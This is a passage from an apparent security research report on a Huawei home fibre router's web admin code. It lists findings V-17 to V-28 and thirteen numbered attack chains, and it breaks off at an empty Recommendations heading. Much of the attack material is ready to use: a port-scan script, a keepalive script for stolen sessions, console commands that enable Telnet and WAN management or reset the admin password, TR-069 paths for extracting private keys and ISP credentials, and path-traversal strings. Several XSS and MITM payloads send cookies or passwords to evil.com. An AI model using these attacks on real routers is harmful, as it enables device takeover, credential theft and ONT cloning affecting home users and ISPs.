### ISP Configuration Modes (CfgMode)

The `index.asp` code handles these CfgMode values, each with different
feature flags and potentially different access controls:

| CfgMode | ISP | Special Features |
|---------|-----|------------------|
| `MEGACABLE2` | Megacable (Mexico) | Base64 login, standard |
| `DVODACOM2WIFI` | Vodacom | PBKDF2+SHA256 login, separate crypto |
| `PLDT` / `PLDT2` | PLDT (Philippines) | Forced password change, WiFi rename |
| `ANTEL` / `ANTEL2` | Antel (Uruguay) | **Default credentials auto-filled!** |
| `TTNET2` | TTNET (Turkey) | Extended lockout behavior |
| `TOT` / `THAILANDNT2` | TOT (Thailand) | CAPTCHA verification |
| `BRAZCLARO` / `COCLAROEBG4` | Claro (Brazil/Colombia) | Custom branding |
| `GLOBE2` | Globe (Philippines) | **FrameModeSwitch on logo click** |
| `CMHK` | CMHK (Hong Kong) | Bridge mode info |
| `DBAA1` | A1 (Austria) | Username hardcoded to "admin" |
| `TELECENTRO` | Telecentro (Argentina) | Custom logo |
| `DICELANDVDF` | Vodafone (Iceland) | Custom colors |
| `DNZTELECOM2WIFI` | DNZ Telecom | Green button UI |

### Hidden Port Discovery

The `util.js` file contains port validation functions (`isValidPort`,
`isValidPort2`, `isValidPortPair`) for ports 1-65535.  The router
typically runs management interfaces on:

| Port | Protocol | Service |
|------|----------|---------|
| 80 | HTTP | Main web admin |
| 443 | HTTPS | Secure web admin (if enabled) |
| 23 | Telnet | CLI access (if enabled) |
| 22 | SSH | Secure CLI (if enabled) |
| 8080 | HTTP | **Alternate admin panel** |
| 8443 | HTTPS | **Alternate secure admin** |
| 7547 | HTTP | **TR-069/CWMP agent** |
| 30005 | TCP | **Huawei OMCI management** |
| 6000-6063 | TCP | Huawei internal services |

### PoC — Port Scan for Hidden Interfaces

```python
import socket

host = "192.168.100.1"
interesting_ports = [
    22, 23, 80, 443, 8080, 8443, 7547,
    30005, 8000, 8888, 9000, 4567,
    6000, 6001, 6002, 6003,
    37215,  # Huawei UPnP
    5060,   # SIP/VoIP
    1723,   # PPTP
]

for port in interesting_ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    if result == 0:
        print(f"OPEN: {host}:{port}")
    sock.close()
```

### TR-069 ACS Interface (Port 7547)

The `ManagementServer` TR-069 object paths (see V-13) contain the ACS
(Auto Configuration Server) URL.  The router's TR-069 agent typically
listens on port **7547** for connection requests from the ISP.  If this
port is accessible from the LAN side, it can be used to:

1. Trigger a TR-069 session
2. Push configuration changes via SOAP/XML
3. Force firmware upgrades
4. Factory reset the device

### Impact

- Alternate admin ports may bypass firewall rules
- TR-069 port allows ISP-level configuration changes
- OMCI port provides low-level ONT management
- Port scan reveals attack surface

---

## V-18: StartFileLoad.asp Session Keepalive Without Auth Verification

**Severity**: MEDIUM  
**File**: `util.js` lines 1826-1839  
**Type**: Session manipulation

### Description

The `AlertEx()` and `ConfirmEx()` functions call
`XmlHttpSendAspFlieWithoutResponse("/html/ssmp/common/StartFileLoad.asp")`
before every alert/confirm dialog.  This ASP page acts as a **session
keepalive** — it prevents the session from timing out while the user is
reading a dialog.

```javascript
function AlertEx(content) {
    XmlHttpSendAspFlieWithoutResponse("/html/ssmp/common/StartFileLoad.asp");
    alert(content);
}
```

### Vulnerability

The `StartFileLoad.asp` endpoint:
1. Accepts unauthenticated GET requests
2. May extend the session timeout without verifying the session is valid
3. Could be used to keep an expired/stolen session alive indefinitely
4. Combined with the static X_HW_Token (V-04), allows indefinite session use

### PoC

```python
import requests, time

# After stealing a session cookie...
session = requests.Session()
session.cookies.set("Cookie", "stolen_session_value", path="/")

# Keep session alive indefinitely
while True:
    resp = session.get(
        "http://192.168.100.1/html/ssmp/common/StartFileLoad.asp"
    )
    print(f"Keepalive: HTTP {resp.status_code}")
    time.sleep(30)  # Ping every 30 seconds
```

### Impact

- Stolen sessions never expire
- Enables persistent access after initial compromise

### Pre-Login (No Authentication Required)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/index.asp` | GET | Login page (leaks server vars) |
| `/login.asp` | GET | Alternative login page |
| `/asp/GetRandCount.asp` | POST | Get anti-CSRF token |
| `/html/ssmp/common/getRandString.asp` | POST | Get pre-login token |
| `/asp/CheckPwdNotLogin.asp?&1=1` | POST | Validate password (oracle) |
| `/asp/GetRandInfo.asp?&1=1` | POST | Get PBKDF2 params (DVODACOM2WIFI mode) |
| `FrameModeSwitch.cgi` | POST | Change device frame mode |
| `MdfPwdNormalNoLg.cgi` | POST | Change normal user password |
| `MdfPwdAdminNoLg.cgi` | POST | Change admin user password |
| `/login.cgi` | POST | Submit login credentials |
| `getCheckCode.cgi` | GET | Get CAPTCHA image |

### Post-Login (Authenticated)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/getajax.cgi?{ObjPath}` | POST | Read TR-069 config data |
| `/html/ssmp/common/GetRandToken.asp` | POST | Refresh session token |
| `logout.cgi` | POST | End session |
| `/html/ssmp/common/StartFileLoad.asp` | GET | File upload init |

---

## V-19: Privilege Escalation via Client-Side Userlevel Manipulation

**Severity**: CRITICAL  
**File**: `index.asp` lines 95, 458, 750, 763, 859, 879, 882  
**Type**: Client-side privilege escalation

### Description

The `Userlevel` variable controls which password-change endpoint is called
and which admin functions are available.  It is set from the return value of
`CheckPassword()` — a client-side function that calls `/asp/CheckPwdNotLogin.asp`:

```javascript
var Userlevel = 0;                  // line 95 — default
Userlevel = CheckResult;            // line 458 — set from server response

if (Userlevel == 2) { return true; }  // line 750 — admin bypass for WiFi checks
if (Userlevel == 2) { return true; }  // line 763 — admin bypass for WiFi checks

if (Userlevel == 1) {               // line 859 — normal user path
    Form.setAction('MdfPwdNormalNoLg.cgi?...X_HW_WebUserInfo.1...');
} else if (Userlevel == 2) {        // line 879 — admin path
    Form.setAction('MdfPwdAdminNoLg.cgi?...X_HW_WebUserInfo.2...');
}
```

The `Userlevel` variable exists **only in the browser** — there is no
server-side session binding.  An attacker can override it in the browser
console or intercept and modify the `CheckPwdNotLogin.asp` response.

### Attack

1. Open browser Developer Tools console on the login page
2. Execute: `Userlevel = 2;`
3. The password change form now targets the **admin** endpoint
   (`MdfPwdAdminNoLg.cgi` with `X_HW_WebUserInfo.2`)
4. If the attacker knows or brute-forces the current password (via V-03),
   they can change the admin password

Alternatively, intercept `CheckPwdNotLogin.asp` response via a local proxy
and change the return value from `1` (normal user) to `2` (admin).

### TR-069 Object Paths Exposed

```
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1  → Normal user
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2  → Admin user
InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1  → WiFi 2.4GHz key
InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1  → WiFi 5GHz key
```

### Impact

- Normal users can escalate to admin by manipulating `Userlevel`
- Admin password can be changed via `MdfPwdAdminNoLg.cgi` without
  having the current admin password (only normal user password needed)
- WiFi password validation is completely bypassed for admin (`Userlevel == 2`)

---

## V-20: DBAA1 Hardcoded Admin Account — Empty Password Bypass

**Severity**: CRITICAL  
**File**: `index.asp` lines 69, 153, 366-367, 442, 1134-1135, 1519-1520  
**Type**: Authentication bypass — hardcoded admin account

### Description

When the ISP configuration flag `DBAA1` is set to `'1'` (A1 Telekom Austria
devices), the login form is reconfigured to:

1. Force the username to `"admin"` (cannot be changed):
```javascript
document.getElementById('txt_Username').value = "admin";  // line 367
```

2. **Skip the empty-password check**, allowing login without a password:
```javascript
if ((DBAA1 != '1') && (Password.value == "")) {  // line 442
    // Only non-DBAA1 devices check for empty password!
    SetDivValue("DivErrPromt", GetLoginDes("frame009"));
    return false;
}
```

3. The login button submits with username `"admin"` regardless of user input:
```javascript
if (DBAA1 == '1') {
    document.getElementById('txt_Username').value = "admin";  // line 1519-1520
}
```

### Attack

The `DBAA1` variable is server-rendered (`var DBAA1 = '0';` line 69).  However:

1. **If the device is configured for A1 Telekom** (`DBAA1 = '1'`), any user
   can log in as `admin` with an empty password
2. Even if `DBAA1 = '0'`, an attacker can override it in the browser console
   to skip the empty-password validation:
   ```javascript
   DBAA1 = '1';
   ```
   This bypasses the client-side check, though the server may still reject
   the empty password

### ISP Modes That Enable DBAA1

From the code analysis, `DBAA1` is set to `'1'` when `CfgMode == 'DBAA1'`,
which corresponds to **A1 Telekom Austria** devices.  These devices are
configured with:
- Fixed username: `admin`
- Favicon: `/images/A1_favicon.ico`
- Title: `"Hybrid Box"` or `"A1 Hybrid Box"`

### Impact

- **Full admin access** on A1 Telekom devices without knowing the password
- Client-side empty-password bypass on all devices via console injection
- Admin username is exposed (always `"admin"` for DBAA1)

---

## V-21: ANTEL ISP Mode Leaks Default Credentials in HTML

**Severity**: CRITICAL  
**File**: `index.asp` lines 98-99, 318-321, 1099, 1468  
**Type**: Default credential exposure

### Description

When `CfgMode` is `'ANTEL'` or `'ANTEL2'` (Antel Uruguay), the server
populates the `defaultUsername` and `defaultPassword` variables with actual
credentials, which are then auto-filled into the login form:

```javascript
var defaultUsername = '';              // line 98 — populated by server for ANTEL
var defaultPassword = '';              // line 99 — populated by server for ANTEL

if ((CfgMode.toUpperCase() == 'ANTEL2') || (CfgMode.toUpperCase() == 'ANTEL')) {
    $("#txt_Username").val(defaultUsername);    // line 319 — auto-fill username
    $("#txt_Password").val(defaultPassword);    // line 320 — auto-fill password
}
```

### Attack

1. `GET /index.asp` — view page source
2. Extract `var defaultUsername = '...'` and `var defaultPassword = '...'`
3. Use these credentials to log in as admin

These credentials are sent in the **HTML response** to any unauthenticated
client.  No login is required to read them.

### Impact

- **Default admin credentials exposed in page source** to all network clients
- Automated mass exploitation possible (scan for HG8145V5 + ANTEL CfgMode)
- The credentials may be the same across all ANTEL-configured devices

---

## V-22: Language Parameter Path Traversal — Script Injection

**Severity**: HIGH  
**File**: `index.asp` lines 551, 565-591  
**Type**: Path traversal / script injection

### Description

The language selection feature dynamically loads JavaScript files based on
the `Language` variable.  The script source URL is constructed by string
concatenation without sanitization:

```javascript
// Line 551 (inferred from language loading logic):
var url = "/frameaspdes/" + Language + "/ssmpdes.js";

// Lines 565-591: Dynamic script loading
function loadLanguage(id, url, callback) {
    var langScript = document.createElement('script');
    langScript.setAttribute('src', url);    // No sanitization!
    document.getElementsByTagName('head')[0].appendChild(langScript);
}
```

The `Language` variable is initialized from `Var_LastLoginLang` (server-set)
or `Var_DefaultLang` (line 63), but can be changed by the `onChangeLanguage()`
function triggered by clicking language links.

### Attack

An attacker could craft a URL or manipulate the cookie to set `Language` to a
path-traversal value:

```
Language = "../../resource/common/evil"
→ Script loads: /frameaspdes/../../resource/common/evil/ssmpdes.js
→ Resolves to:  /resource/common/evil/ssmpdes.js
```

If the attacker can upload a file (via config restore or firmware upload),
they could place a malicious `ssmpdes.js` at a traversed path.

### Impact

- Arbitrary JavaScript execution in admin browser context
- Session hijacking via XSS
- Combined with config upload (V-15), enables persistent XSS

---

## V-23: DVODACOM2WIFI Server-Controlled PBKDF2 Iterations Downgrade

**Severity**: HIGH  
**File**: `index.asp` lines 125-127, 393-419  
**Type**: Cryptographic downgrade attack

### Description

The DVODACOM2WIFI login mode uses PBKDF2-SHA256 for password hashing.
However, the **iteration count is controlled by the server response** from
`/asp/GetRandInfo.asp`:

```javascript
$.ajax({
    url: '/asp/GetRandInfo.asp?&1=1',
    data: 'Username=' + Username.value,
    success: function(data) {
        infos = dealDataWithFun(data);  // [token, salt, iterations]
    }
});

var pwdPbkf2 = CryptoJS.PBKDF2(Password.value, infos[1], {
    keySize: 8,
    hasher: CryptoJS.algo.SHA256,
    iterations: parseInt(infos[2])   // Server controls this!
});
```

A MITM attacker intercepting `/asp/GetRandInfo.asp` can:
1. Set `iterations` to `1`, making PBKDF2 trivially breakable
2. Set `salt` to a known value, enabling rainbow table attacks
3. Capture the resulting hash for offline cracking

Additionally, the `dealDataWithFun()` function (V-05) **executes the server
response as JavaScript**, meaning a MITM can inject arbitrary code:

```javascript
// MITM injects instead of [token, salt, iterations]:
function(){document.location='http://evil.com/?pw='+Password.value;return ['tok','s',1]}
```

### Impact

- **Password theft** via MITM on local network
- Cryptographic downgrade to 1 iteration makes brute-force trivial
- Code injection via `dealDataWithFun()` allows direct password exfiltration

---

## V-24: DOM-Based XSS via innerHTML Without Encoding

**Severity**: HIGH  
**File**: `util.js` lines 8, 1253-1260  
**Type**: Cross-site scripting (DOM-based)

### Description

The `util.js` library contains multiple functions that write to `innerHTML`
**without encoding**, plus two functions that explicitly bypass encoding:

```javascript
// Line 8: SetDivValue — no encoding
function SetDivValue(Id, Value) {
    var Div = document.getElementById(Id);
    Div.innerHTML = Value;   // RAW HTML injection
}

// Line 1253: Explicitly no-encode variant
function setObjNoEncodeInnerHtmlValue(obj, sValue) {
    obj.innerHTML = sValue;  // "NoEncode" — deliberately unsafe
}

// Line 1258: Same pattern by ID
function setNoEncodeInnerHtmlValue(sId, sValue) {
    getElement(sId).innerHTML = sValue;
}
```

While `setElementInnerHtmlById()` (line 1238) does use `htmlencode()`, the
`NoEncode` variants are available and used when HTML content must be rendered.

### Attack

If any user-controllable data flows into `SetDivValue()` or the `NoEncode`
variants, an attacker can inject arbitrary HTML/JavaScript:

```
Value = '<img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">'
```

The `SetDivValue()` function is called extensively in `index.asp` (lines 186,
218, 227, 274, etc.) with values from `GetLoginDes()` — but also with
error messages that may include user input.

### Impact

- Session hijacking via cookie theft
- Admin credential theft via keylogging injection
- Persistent XSS if combined with stored config values

---

## V-25: TR-069 Paths for Certificate, Key, and Credential Extraction

**Severity**: CRITICAL  
**File**: `util.js` line 2765 (`getajax.cgi`), `index.asp` various TR-069 paths  
**Type**: Sensitive data exfiltration

### Description

The `getajax.cgi` endpoint accepts arbitrary TR-069 object paths. Beyond
the paths already documented in V-08 and V-13, the following Huawei-specific
TR-069 paths can be used to extract **certificates, private keys, stored
credentials, and device databases**:

### Certificate and Key Extraction

| TR-069 Path | Content |
|-------------|---------|
| `InternetGatewayDevice.X_HW_Security.Certificate.` | All installed certificates |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.` | First certificate (PEM) |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.SerialNumber` | Certificate serial |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.Issuer` | Certificate issuer DN |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.Subject` | Certificate subject |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.X_HW_Certificate` | **PEM-encoded certificate body** |
| `InternetGatewayDevice.X_HW_Security.Certificate.1.X_HW_PrivateKey` | **PEM-encoded private key** |
| `InternetGatewayDevice.DeviceInfo.X_HW_InnerVersion` | Internal firmware version |
| `InternetGatewayDevice.ManagementServer.X_HW_Certificate` | **TR-069 ACS client certificate** |
| `InternetGatewayDevice.ManagementServer.X_HW_PrivateKey` | **TR-069 ACS private key** |

### Stored Credentials Extraction

| TR-069 Path | Content |
|-------------|---------|
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.UserName` | Web admin username |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.Password` | **Web admin password (may be cleartext)** |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.UserName` | Web superadmin username |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.Password` | **Web superadmin password** |
| `InternetGatewayDevice.ManagementServer.Username` | TR-069 ACS username |
| `InternetGatewayDevice.ManagementServer.Password` | **TR-069 ACS password** |
| `InternetGatewayDevice.ManagementServer.ConnectionRequestUsername` | Connection-request auth user |
| `InternetGatewayDevice.ManagementServer.ConnectionRequestPassword` | **Connection-request auth password** |
| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username` | PPPoE username |
| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password` | **PPPoE password** |
| `InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthUserName` | VoIP SIP user |
| `InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthPassword` | **VoIP SIP password** |

### WiFi Key Extraction

| TR-069 Path | Content |
|-------------|---------|
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.PreSharedKey` | **WPA2 PSK (2.4GHz)** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase` | **WPA2 passphrase** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.WEPKey.1.WEPKey` | **WEP key** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1.PreSharedKey` | **WPA2 PSK (5GHz)** |

### GPON/ONT Parameters

| TR-069 Path | Content |
|-------------|---------|
| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.PLOAM_Password` | **GPON PLOAM password** |
| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.LOID` | GPON Logical ONU ID |
| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.LOIDPassword` | **GPON LOID password** |
| `InternetGatewayDevice.DeviceInfo.SerialNumber` | Device serial number |
| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.OntSN` | ONT serial number |

### Device Configuration Database

| TR-069 Path | Content |
|-------------|---------|
| `InternetGatewayDevice.` | **Entire device configuration tree** |
| `InternetGatewayDevice.X_HW_Security.` | Security settings, firewall rules |
| `InternetGatewayDevice.X_HW_Security.AclServices.` | ACL service definitions |
| `InternetGatewayDevice.X_HW_Security.Firewall.` | Firewall rules |
| `InternetGatewayDevice.LANDevice.1.Hosts.Host.` | All connected devices table |
| `InternetGatewayDevice.Layer3Forwarding.Forwarding.` | Static routes |
| `InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPStaticAddress.` | DHCP reservations |

### Impact

- **Private keys** for TLS certificates can be extracted and used to
  impersonate the router or decrypt HTTPS traffic
- **TR-069 ACS credentials** allow impersonating the ISP management server
- **PPPoE/VoIP credentials** allow service theft
- **GPON PLOAM/LOID passwords** allow ONT cloning
- **Full device config tree** can be downloaded via the root path
  `InternetGatewayDevice.`

---

## V-26: HWGetAction/ajaxSumitData Arbitrary Authenticated Write

**Severity**: CRITICAL  
**File**: `util.js` lines 2786-2807, 3340-3353  
**Type**: Arbitrary config write / internal file overwrite

### Description

The `HWGetAction()` and `ajaxSumitData()` functions allow an authenticated
user to POST arbitrary data to **any URL** on the router.  These are generic
write functions used by all admin pages to modify the device configuration:

```javascript
// util.js line 2786 — accepts ANY URL
function HWGetAction(Url, ParameterList, tokenvalue) {
    var tokenstring = (null == tokenvalue) ? "" : ("x.X_HW_Token=" + tokenvalue);
    $.ajax({
        type : "POST",
        url : Url,                         // ← No URL validation
        data: ParameterList + tokenstring,  // ← Arbitrary parameters
        success : function(data) { ResultTmp = hexDecode(data); }
    });
}

// util.js line 3340 — auto-adds token then POSTs to any path
function ajaxSumitData(path, submitData, isLogin, callBack) {
    $.ajax({
        type: 'POST',
        url: path,                                   // ← Any path
        data: getDataWithToken(submitData, isLogin),  // ← Auto-token
        success: function (data) { callBack(dealDataWithFun(data)); }
    });
}
```

### Attack — Write Configuration via getajax.cgi / setajax.cgi

While `getajax.cgi` reads TR-069 objects, the write counterpart accepts
parameter-value pairs.  The `HWGetAction()` function can be called from the
browser console after authenticating:

```javascript
// Browser console — Enable telnet (example)
HWGetAction(
    '/setajax.cgi?InternetGatewayDevice.X_HW_CLITelnetAccess.',
    'Enable=1&LanEnable=1&',
    GetToken()
);

// Browser console — Change admin password
HWGetAction(
    '/setajax.cgi?InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.',
    'Password=newpassword&',
    GetToken()
);

// Browser console — Enable WAN-side management
HWGetAction(
    '/setajax.cgi?InternetGatewayDevice.X_HW_Security.AclServices.',
    'HttpEnable=1&HttpWanPort=8080&',
    GetToken()
);
```

### Known Write Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/setajax.cgi?{ObjPath}` | Write TR-069 parameters |
| `/cfgaction.cgi` | Config backup/restore/factory-reset |
| `/configservice.cgi` | Service configuration |
| `/set.cgi` | Generic parameter setter |
| `/html/ssmp/default/set.cgi` | Per-module parameter setter |

### Impact

- **Full device configuration modification** with any admin session
- **Enable Telnet/SSH** from browser console
- **Change all passwords** (admin, normal, WiFi, PPPoE, VoIP)
- **Open WAN-side management** (expose admin panel to internet)
- **Modify firewall rules** to allow inbound traffic
- **Redirect DNS** to attacker-controlled server
- Combined with V-19 (Userlevel escalation), a normal user can write
  admin-level configuration

---

## V-27: hexDecode + dealDataWithFun Response Chain — RCE via getajax.cgi

**Severity**: CRITICAL  
**File**: `util.js` lines 2768, 3261-3273, 3287-3298  
**Type**: Remote code execution via response injection

### Description

Every HTTP response from the router's CGI endpoints passes through a
two-stage processing chain before reaching JavaScript code:

```
Server Response → hexDecode() → dealDataWithFun() → Application Code
```

**Stage 1 — `hexDecode()`** (line 3261):
```javascript
function hexDecode(str) {
    if (typeof str === 'string' && /\\x(\w{2})/.test(str)) {
        return str.replace(/\\x(\w{2})/g, function(_, $1) {
            return String.fromCharCode(parseInt($1, 16));
        });
    }
    return str;
}
```

**Stage 2 — `dealDataWithFun()`** (line 3268):
```javascript
function dealDataWithFun(str) {
    if (typeof str === 'string' && str.indexOf('function') === 0) {
        return Function('"use strict";return (' + str + ')')()();
    }
    return str;
}
```

This chain is used by **every data-fetching function** in util.js:

| Function | Line | Uses hexDecode | Uses dealDataWithFun |
|----------|------|---------------|---------------------|
| `HwAjaxGetPara()` | 2768 | ✅ | via return | 
| `CheckHwAjaxRet()` | 2776 | ✅ | — |
| `HWGetAction()` | 2796 | ✅ | — |
| `ajaxGetAspData()` | 3291 | — | ✅ |
| `getDynamicData()` | 3308 | — | ✅ |
| `ajaxSumitData()` | 3349 | — | ✅ |

### Attack — MITM Code Injection

Since the router uses **HTTP** (not HTTPS), a MITM attacker on the local
network can intercept **any** response from `getajax.cgi` or any ASP
endpoint and replace it with executable JavaScript:

```
Original response:  { "WLANEnable": "1", "SSID": "MyWifi" }
Injected response:  function(){
    // Steal admin cookie
    new Image().src='http://evil.com/steal?c='+document.cookie;
    // Also return valid-looking data to avoid suspicion
    return { "WLANEnable": "1", "SSID": "MyWifi" };
}
```

The `dealDataWithFun()` function checks only that the string starts with
`"function"` — then executes it as arbitrary JavaScript via the `Function()`
constructor (equivalent to `eval()`).

### Attack — hexDecode Payload Obfuscation

The `hexDecode()` stage allows payloads to be **hex-obfuscated** to bypass
any naive content filters:

```
\x66\x75\x6e\x63\x74\x69\x6f\x6e  →  "function"
```

A hex-encoded payload that starts with `\x66\x75\x6e\x63\x74\x69\x6f\x6e`
will pass through `hexDecode()` to become a string starting with `function`,
which `dealDataWithFun()` will then execute.

### Files Where This Chain Is Active

The `dealDataWithFun()` function appears in three separate files:

1. `util.js` line 3268 — used by `ajaxGetAspData()`, `getDynamicData()`,
   `ajaxSumitData()`
2. `safelogin.js` line 507 — used by `ajaxGetAspData()` in auth context
3. `index.asp` line 381 — used by `loginWithSha256()` for GetRandInfo response

### Impact

- **Remote code execution** in the admin's browser via MITM
- All TR-069 data queries can be intercepted and replaced with malicious code
- Combined with ARP spoofing on the LAN, any admin page load triggers RCE
- The hex-encoding stage provides obfuscation for payloads
- Since this is in the **login page** (index.asp), even pre-auth traffic
  is vulnerable (loginWithSha256 DVODACOM2WIFI path)

---

## V-28: RequestFile Parameter Injection in CGI Endpoints

**Severity**: HIGH  
**File**: `util.js` lines 3121, 3136, 3150; `index.asp` lines 864-882, 966  
**Type**: Open redirect / path injection

### Description

Multiple CGI endpoints accept a `RequestFile` parameter that controls where
the browser redirects after the operation completes.  This parameter is
**not validated** — it's passed directly to the server which issues a
redirect or includes the specified page:

```javascript
// util.js — Logout with arbitrary redirect
'logout.cgi?RequestFile=html/logout.html'              // line 3121
'logout.cgi?RequestFile=/html/logout.html'             // line 3136

// index.asp — Password change with redirect to login
'MdfPwdNormalNoLg.cgi?&x=...&RequestFile=login.asp'   // line 864

// index.asp — FrameMode switch with redirect
'FrameModeSwitch.cgi?&RequestFile=/login.asp'          // line 966
```

The `LogoutWithPara()` function (util.js line 3141) also accepts a
`SubmitType` parameter, adding another injection point:

```javascript
function LogoutWithPara(submitType, location, diffAdminPath, curUser) {
    var url = '/logout.cgi?';
    if (submitType != "") {
        url += '&SubmitType=' + submitType;  // Not sanitized
    }
    url += '&RequestFile=/html/logout.html';
    // ...
}
```

### Attack — Open Redirect via RequestFile

```
/logout.cgi?RequestFile=http://evil.com/phishing/login.html
/login.cgi?RequestFile=http://evil.com/steal
/FrameModeSwitch.cgi?RequestFile=http://evil.com/
```

If the server follows the `RequestFile` parameter for redirects, the user
is sent to an attacker-controlled page that mimics the router login.

### Attack — Internal File Inclusion via RequestFile

If the server-side CGI treats `RequestFile` as a file path for inclusion
(common in Huawei's HTTPD), path traversal is possible:

```
/logout.cgi?RequestFile=../../etc/passwd
/logout.cgi?RequestFile=../../mnt/jffs2/hw_ctree.xml
/logout.cgi?RequestFile=../../tmp/hw_ctree.xml
```

### Attack — SubmitType Parameter Injection

The `SubmitType` parameter in `LogoutWithPara()` is concatenated directly
into the URL without sanitization:

```
SubmitType = "1&ExtraParam=injected"
→ URL: /logout.cgi?&SubmitType=1&ExtraParam=injected&RequestFile=/html/logout.html
```

### Endpoints Accepting RequestFile

| Endpoint | Parameter | Usage |
|----------|-----------|-------|
| `/login.cgi` | `CheckCodeErrFile` | Redirect on captcha error |
| `/logout.cgi` | `RequestFile` | Post-logout redirect page |
| `MdfPwdNormalNoLg.cgi` | `RequestFile` | Post-password-change redirect |
| `MdfPwdAdminNoLg.cgi` | `RequestFile` | Post-password-change redirect |
| `FrameModeSwitch.cgi` | `RequestFile` | Post-mode-switch redirect |

### Impact

- **Open redirect** — phishing attacks using the router's domain
- **Internal file read** — if RequestFile triggers server-side file inclusion
- **Parameter injection** — add extra CGI parameters via unsanitized inputs
- Combined with V-07 (unauthenticated FrameModeSwitch), an attacker can
  switch the device mode AND redirect to a phishing page in one request

```
1. GET /index.asp → extract errloginlockNum, defaultUsername
2. POST /html/ssmp/common/getRandString.asp → get pre-login token
3. POST /asp/CheckPwdNotLogin.asp → brute-force password (no lockout?)
4. POST /login.cgi with discovered password → admin session
```

### Path 2: Pre-Login Password Change → Account Takeover

```
1. POST /html/ssmp/common/getRandString.asp → get pre-login token
2. POST /asp/CheckPwdNotLogin.asp → verify current password
3. POST MdfPwdAdminNoLg.cgi → change admin password to attacker's
4. POST /login.cgi with new password → admin session
```

### Path 3: TR-069 Data Exfiltration → Service Credential Theft

```
1. Login with any valid account
2. POST /getajax.cgi?InternetGatewayDevice.ManagementServer. → ACS creds
3. POST /getajax.cgi?InternetGatewayDevice.WANDevice. → PPPoE creds
4. POST /getajax.cgi?InternetGatewayDevice.LANDevice.1.WLANConfiguration. → WiFi keys
```

### Path 4: Enable Remote Access (Telnet/SSH)

```
1. Login as admin
2. Probe TR-069 paths for telnet/SSH settings:
   - InternetGatewayDevice.X_HW_CLITelnetAccess.
   - InternetGatewayDevice.X_HW_CLISSHAccess.
   - InternetGatewayDevice.X_HW_DEBUG.
3. Set enable flags via appropriate CGI endpoints
```

### Path 5: MitM → Full Router Compromise

```
1. ARP spoof on local network
2. Intercept any admin HTTP request
3. Inject malicious response targeting dealDataWithFun()
4. Execute arbitrary JS → steal session → modify config
```

### Path 6: DBAA1 Admin Bypass → Full Control

```
1. Detect DBAA1 mode: GET /index.asp → check var DBAA1 == '1'
2. Login with username "admin" and empty password (empty-password check skipped)
3. Full admin access — read config, enable Telnet/SSH, extract credentials
```

### Path 7: ANTEL Default Credentials → Instant Admin

```
1. GET /index.asp → extract var defaultUsername and var defaultPassword from HTML
2. If CfgMode == 'ANTEL' or 'ANTEL2': credentials are pre-filled by server
3. POST /login.cgi with extracted credentials → admin session
```

### Path 8: Userlevel Escalation → Admin Password Change

```
1. Log in as normal user (Userlevel 1)
2. Set Userlevel = 2 in browser console
3. Submit password change → routed to MdfPwdAdminNoLg.cgi
4. Admin password changed to attacker's password
5. Re-login as admin with new password
```

### Path 9: Certificate & Key Extraction → Traffic Decryption

```
1. Login as admin
2. POST /getajax.cgi?InternetGatewayDevice.X_HW_Security.Certificate.1.
3. Extract X_HW_Certificate (PEM cert) and X_HW_PrivateKey (PEM key)
4. Use private key to decrypt intercepted HTTPS traffic
5. Or impersonate the router with stolen certificate
```

### Path 10: GPON Credential Extraction → ONT Cloning

```
1. Login as admin
2. POST /getajax.cgi?InternetGatewayDevice.DeviceInfo.X_HW_OMCI.
3. Extract PLOAM_Password, LOID, LOIDPassword, OntSN
4. Configure a clone device with these GPON parameters
5. Clone connects to ISP OLT as the original device
```

### Path 11: Config Write → Open WAN Management → Remote Access

```
1. Login as admin (or escalate via V-19)
2. HWGetAction('/setajax.cgi?InternetGatewayDevice.X_HW_Security.AclServices.',
              'HttpEnable=1&HttpWanPort=8080&', GetToken())
3. Router admin panel now accessible from WAN side on port 8080
4. Attacker accesses admin panel remotely from the internet
```

### Path 12: MITM → dealDataWithFun RCE → Full Compromise

```
1. ARP spoof on local LAN
2. Intercept any getajax.cgi or ASP response
3. Replace response with: function(){new Image().src='http://evil.com/?c='+document.cookie;return {}}
4. hexDecode passes the string, dealDataWithFun executes it
5. Admin session stolen → attacker controls router
```

### Path 13: RequestFile Injection → Config File Download

```
1. POST /logout.cgi?RequestFile=../../mnt/jffs2/hw_ctree.xml
2. If server includes the file, router XML config is returned
3. Decrypt config file (AES-128 or XOR, key from hw_boardinfo)
4. Extract ALL stored passwords, keys, and certificates
```

---

## Recommendations

